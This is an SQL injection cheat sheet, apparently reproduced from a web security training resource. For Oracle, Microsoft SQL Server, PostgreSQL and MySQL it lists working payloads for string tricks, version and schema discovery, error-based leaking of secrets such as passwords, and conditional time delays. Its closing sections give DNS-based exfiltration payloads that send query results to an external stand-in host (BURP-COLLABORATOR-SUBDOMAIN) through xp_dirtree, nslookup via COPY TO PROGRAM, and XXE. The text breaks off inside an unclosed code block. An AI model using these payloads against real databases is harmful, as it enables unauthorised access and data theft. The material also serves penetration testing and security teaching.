# SQL Injection Cheat Sheet

This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.

## String Concatenation

You can concatenate together multiple strings to make a single string.

- Oracle: `'foo'||'bar'`
- Microsoft: `'foo'+'bar'`
- PostgreSQL: `'foo'||'bar'`
- MySQL: `'foo' 'bar'` [Note the space between the two strings] or `CONCAT('foo','bar')`

## Substring

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based.

- Oracle: `SUBSTR('foobar', 4, 2)`
- Microsoft: `SUBSTRING('foobar', 4, 2)`
- PostgreSQL: `SUBSTRING('foobar', 4, 2)`
- MySQL: `SUBSTRING('foobar', 4, 2)`

## Comments

You can use comments to truncate a query and remove the portion of the original query that follows your input.

- Oracle: `--comment`
- Microsoft: `--comment` or `/*comment*/`
- PostgreSQL: `--comment` or `/*comment*/`
- MySQL: `#comment`, `-- comment` [Note the space after the double dash], or `/*comment*/`

## Database Version

You can query the database to determine its type and version.

- Oracle: `SELECT banner FROM v$version` or `SELECT version FROM v$instance`
- Microsoft: `SELECT @@version`
- PostgreSQL: `SELECT version()`
- MySQL: `SELECT @@version`

## Database Contents

You can list the tables that exist in the database and the columns that those tables contain.

- Oracle: `SELECT * FROM all_tables` or `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`
- Microsoft: `SELECT * FROM information_schema.tables` or `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
- PostgreSQL: `SELECT * FROM information_schema.tables` or `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
- MySQL: `SELECT * FROM information_schema.tables` or `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`

## Conditional Errors

You can test a single boolean condition and trigger a database error if the condition is true.

- Oracle: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
- Microsoft: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`
- PostgreSQL: `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`
- MySQL: `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`

## Extracting Data via Visible Error Messages

You can potentially elicit error messages that leak sensitive data returned by your malicious query.

- Microsoft: `SELECT 'foo' WHERE 1 = (SELECT 'secret')`
- PostgreSQL: `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`
- MySQL: `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))`

## Batched (or Stacked) Queries

You can use batched queries to execute multiple queries in succession.

- Oracle: Does not support batched queries.
- Microsoft: `QUERY-1-HERE; QUERY-2-HERE` or `QUERY-1-HERE QUERY-2-HERE`
- PostgreSQL: `QUERY-1-HERE; QUERY-2-HERE`
- MySQL: `QUERY-1-HERE; QUERY-2-HERE` 

> Note: With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.

## Time Delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

- Oracle: `dbms_pipe.receive_message(('a'),10)`
- Microsoft: `WAITFOR DELAY '0:0:10'`
- PostgreSQL: `SELECT pg_sleep(10)`
- MySQL: `SELECT SLEEP(10)`

## Conditional Time Delays

You can test a single boolean condition and trigger a time delay if the condition is true.

- Oracle: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
- Microsoft: `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`
- PostgreSQL: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`
- MySQL: `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`

## DNS Lookup

You can cause the database to perform a DNS lookup to an external domain.

- Oracle (XXE vulnerability): `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
- Oracle (Elevated privileges): `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`
- Microsoft: `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`
- PostgreSQL: `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`
- MySQL: `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')` or `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`

> Note: MySQL techniques typically work on Windows only.

## DNS Lookup with Data Exfiltration

You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query.

- Oracle: `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
- Microsoft: `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`
- PostgreSQL:

  ```sql
  create OR replace function f() returns void as $$
  declare c text;
  declare p text;
  begin
    SELECT into p (SELECT YOUR-QUERY-HERE);
    c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
    execute c;
  END;
  $$ language plpgsql security definer;
  SELECT f();

